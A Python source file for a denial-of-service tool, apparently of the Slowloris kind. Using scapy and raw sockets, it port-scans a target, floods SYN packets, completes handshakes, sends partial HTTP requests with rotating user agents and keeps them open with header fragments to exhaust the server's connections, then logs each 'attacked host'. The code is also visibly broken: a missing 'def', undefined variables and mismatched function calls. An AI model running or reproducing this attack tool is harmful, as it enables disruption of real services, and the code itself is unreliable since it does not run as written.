print('Preparation: Import libraries...')
import TCPackets
import Sniffer_TCP
import socket
import random
import asyncio
import time
import threading
import sqlite3
from scapy.all import *

#src_ip = ''
#dst_ip = ''
class Core:
	__init__(self):
		self.src_ip = None
		self.dst_ip = None
		self.connections = []
		self.sniffer = None
		self.open_ports = None
		self.free_ports = None
		self.open_ports = None
		self.maximum_connections = None
		self.cursor = None
		self.conn = None
		self.user_agents = []

# connections = []
# src_ip = ''
# dst_ip = ''
# sniffer = None
# open_ports = None
# free_ports = None
# open_ports = None
# maximum_connections = None

# conn = sqlite3.connect('database.db')
# cursor = conn.cursor()
# try:
# 	cursor.execute("""CREATE TABLE checked_ip (host text, port text, max text) """)
# 	print('Database was created')
# except:
# 	pass
# user_agents = [
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
#     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
#     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
#     "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
#     "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
#     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
# ]

def check_max(core):
	# global connections

	t = time.time()
	# global maximum_connections

	while True:
		
		if (time.time() - t >= 5 and len(core.connections)) or (time.time() - t > 10):
			print('Checking...')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(5)
			try:
				s.connect((core.dst_ip, core.dst_port))
				s.close()
			except socket.timeout:
				print('Maximum connections: {}\nPlease, wait a little bit.\nClosing...'.format(len(core.connections)))
				s.close()
				core.maximum_connections = len(core.connections)
				break
			except:
				pass
			t = time.time()

def ports_scanner(dst_ip):
	print('Scanning open ports at {}...'.format(dst_ip))
	open_ports = list()
	packet = IP(dst=dst_ip)/TCP(dport=(1,443),flags='S')
	res, unans = sr(packet, timeout=10, verbose=False)
	for i in res:
		if i[1][1].flags == 18:
			open_ports.append(i[1].sport)
			packet = IP(dst=dst_ip)/TCP(dport=i[1][1].sport,flags='R')
			send(packet, verbose=False)

	if open_ports:
		print('Open ports on {}: {}\n'.format(dst_ip, open_ports))
	else:
		print('Host {} has no open ports.'.format(dst_ip))
	return open_ports

def free_ports_init():
	free_ports = list()
	for i in range(65535):
		free_ports.append(i+1)
	return free_ports

class Connection():
	def __init__(self, src_ip, src_port, ack, seq):
		self.src_ip = src_ip
		self.src_port = src_port
		self.ack = ack
		self.seq = seq


async def send_syn(core):

	# global src_ip
	# global dst_ip
	# global dst_port
	# global quantity_of_connections
	# global free_ports
	# global sniffer
	# global maximum_connections
	# global open_ports

	if not core.dst_port and not core.open_ports:

		core.open_ports = ports_scanner(core.dst_ip)
	
		while True:
			core.dst_port = int(input('Which one (port)? '))
			if core.dst_port not in core.open_ports:
				print('{} is not open. Choose from: {}'.format(core.dst_port, core.open_ports))
			else:
				core.open_ports.remove(dst_port)
				break
	elif core.open_ports and not core.dst_port:
		while True:
			print('Open ports: {}'.format(core.open_ports))
			core.dst_port = int(input('Which one (port)? '))
			if core.dst_port not in core.open_ports and core.open_ports:
				print('{} is not open. Choose from: {}'.format(core.dst_port, core.open_ports))
			else:
				break


	t = time.time()

	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	flags = 0b0000010 #SYN flag
	core.src_port = random.choice(core.free_ports)
	core.free_ports.remove(core.src_port)

	packet = TCPackets.TCPPacket(core.src_ip, core.src_port, core.dst_ip, core.dst_port, flags)
	core.sniffer.ip = core.src_ip

	#x = int(input('How many connections? '))
	t = time.time()
	#for i in range(x):
	while not core.maximum_connections:	
		s.sendto(packet.build(), (core.dst_ip, core.dst_port))
		packet.seq = random.randint(0, 4294967295)
		core.src_port = random.choice(core.free_ports)
		core.free_ports.remove(core.src_port)
		packet.src_port = core.src_port
		await asyncio.sleep(0)
		
		if core.maximum_connections != None:
			print('{} packets with SYN flag was/were sended in {}'.format(65535 - len(core.free_ports), time.time() - t))
			break


def send_ack_and_psh(sock, response_packet, dst_ip, dst_port, src_ip, connections, user_agents):

	# global connections
	# global user_agents

	flags = 0b00010000 #ACK flag
	packet = TCPackets.TCPPacket(src_ip, response_packet.dst_port, dst_ip, dst_port, flags)
	packet.seq = response_packet.ack
	packet.ack = response_packet.seq + 1

	sock.sendto(packet.build(), (dst_ip, dst_port))

	packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='PA', seq=response_packet.ack, ack=response_packet.seq+1)

	data = ('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(random.choice(user_agents)) + "{}\r\n".format("Accept-language: en-US,en,q=0.5"))
								
	send(packet/data, verbose=False)
	con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack + len(data))
	connections.append(con)


async def connect(core):

	# global sniffer
	# global src_ip
	# global dst_ip
	# global dst_port
	# global connections
	# global free_ports
	# global maximum_connections

	ports = list()

	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	
	while True:
		
		if core.sniffer.TCP_stack:
			
			response_packet = core.sniffer.TCP_stack[0]

			if (response_packet.flags['S'] and response_packet.flags['A']) and (response_packet.dst_port not in ports) and (response_packet.dst_port not in free_ports):
				
				thr = threading.Thread(target=send_ack_and_psh, args=(s, response_packet, core.dst_ip, core.dst_port, core.src_ip, core.connections, core.user_agents))
				thr.start()

				ports.append(response_packet.dst_port)

			elif response_packet.flags['F'] and (response_packet.dst_port not in core.free_ports):
				
				if response_packet.dst_port in ports:
					packet = TCPackets.TCPPacket(core.src_ip, response_packet.dst_port, core.dst_ip, core.dst_port, 0b00010000)
					s.sendto(packet.build(), (core.dst_ip, core.dst_port))	
					core.connections.pop(ports.index(response_packet.dst_port))
					ports.remove(response_packet.dst_port)
					core.free_ports.append(response_packet.dst_port)			
				
					core.src_port = random.choice(core.free_ports)
					core.free_ports.remove(core.src_port)
			
			elif response_packet.flags['R'] and (response_packet.dst_port not in core.free_ports):
				if response_packet.dst_port in ports:
					core.connections.pop(ports.index(response_packet.dst_port))
					ports.remove(response_packet.dst_port)
					core.free_ports.append(response_packet.dst_port)
					
				
			core.sniffer.TCP_stack.pop(0)
			
			
		if core.maximum_connections != None:
			core.sniffer.stop = True
			break

		if len(core.sniffer.TCP_stack) == 0:
			await asyncio.sleep(0)

def send_keepalive_packet(src_ip, dst_ip, dst_port, connections):
	# global connections
	t = time.time()
	packet = IP(dst=dst_ip)/TCP(dport=dst_port, flags='A')
	for conn in connections:
		packet[1].sport = conn.src_port
		packet[1].seq = conn.seq
		packet[1].ack = conn.ack
		data = ('X-a: {}\r\n'.format(random.randint(0, 5000)))
		send(packet/data, verbose=False)
		conn.seq += len(data)

async def keep_connection_open(core):

	# global connections
	# global src_ip
	# global dst_ip
	# global dst_port
	# global maximum_connections
	
	while True:
		
		if not core.maximum_connections:

			if len(core.connections) != 0:
				thread = threading.Thread(target=send_keepalive_packet, args=(core.src_ip, core.dst_ip, core.dst_port, core.connections))
				thread.start()
				print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(core.connections)))

		if core.maximum_connections != None:
			core.connections = []
			break

		await asyncio.sleep(10)
						

async def main_loop(core):

	# global sniffer

	t1 = asyncio.create_task(send_syn(core))
	t2 = asyncio.create_task(connect(core))
	t4 = asyncio.create_task(keep_connection_open(core))

	await asyncio.gather(t1, t2, t4)

def start():

	# global src_ip
	# global dst_ip
	# global dst_port
	# global sniffer
	# global open_ports
	# global free_ports
	# global connections
	# global maximum_connections
	# global cursor
	# global conn

	core = Core()

	core.conn = sqlite3.connect('database.db')
	core.cursor = conn.cursor()
	try:
		cursor.execute("""CREATE TABLE checked_ip (host text, port text, max text) """)
		print('Database was created')
	except:
		pass

	

	core.user_agents = user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
	
	core.free_ports = free_ports_init()

	try:
		core.dst_ip = sys.argv[1]
	except:
		core.dst_ip = input('Enter IP: ')

	print('Attacked host: {}'.format(core.dst_ip))

	p = IP(dst=core.dst_ip)/TCP(dport=8080, flags='S')
	r = sr1(p, verbose=False, timeout=5)

	if r:
		core.src_ip = str(r[0].dst)
		core.sniffer = Sniffer_TCP.Sniffer(src_ip)
	else:
		core.src_ip = ''
		core.dst_ip = ''


	print('Your ip: {}'.format(core.src_ip))
	if core.src_ip != '':
		try:
			core.dst_port = int(sys.argv[2])
		except:
			core.open_ports = ports_scanner(core.dst_ip)
			
			while True:
				core.dst_port = int(input('Which one (port)? '))
				if core.dst_port not in core.open_ports:
					print('{} is not open. Choose from: {}'.format(core.dst_port, core.open_ports))
				else:
					break
	else:
		core.dst_port = '-'

	print('Attacked port: {}'.format(core.dst_port))

	if core.dst_ip == 'localhost' or core.dst_ip == '127.0.0.1' or core.dst_ip == src_ip or core.dst_ip == '':
		print('You try to reach smth unreachable (Program is not working with localhost. Try to start your server on VM)')
	else:
		thread_sniffer = threading.Thread(target=sniffer.sniff)
		thread_sniffer.start()

		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(5)
				s.connect((core.dst_ip, core.dst_port))
				s.close()
			except ConnectionRefusedError:
				print('Host is down')
				core.sniffer.stop = True
				break
			except socket.timeout:
				print('Host is down')
				core.sniffer.stop = True
				break			
			
			if core.maximum_connections == None:
				thread = threading.Thread(target=check_max, args=(dst_ip, dst_port, core))
				thread.start()
				asyncio.run(main_loop())
				while True:
					
					if core.maximum_connections != None:
						core.cursor.execute("INSERT INTO checked_ip (host, port, max) VALUES (?, ?, ?)", (dst_ip, str(dst_port), str(maximum_connections)))
						core.conn.commit()
						file = open('database_txt.txt', 'a+')
						file.write('{} - {} - {}\n'.format(core.dst_ip, core.dst_port, core.maximum_connections))
						file.close()
						break

	core.cursor.close()

if __name__ == '__main__':
	start()


